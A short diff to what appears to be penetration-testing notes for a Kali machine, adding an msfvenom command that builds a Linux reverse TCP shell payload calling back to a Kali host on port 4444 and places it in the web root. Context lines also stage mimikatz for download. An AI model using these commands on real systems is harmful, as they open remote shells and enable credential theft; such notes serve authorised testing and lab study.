@@ -25,6 +25,12 @@ If Kali isn't setup as web server, use `python3 -m http.server 80 &> /dev/null &
 cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
 ```
 
+### Linux reverse shell TCP:
+
+```console
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f py -o /var/www/html/reverse.py
+```
+
 ### Windows reverse shell TCP:
 
 ```console
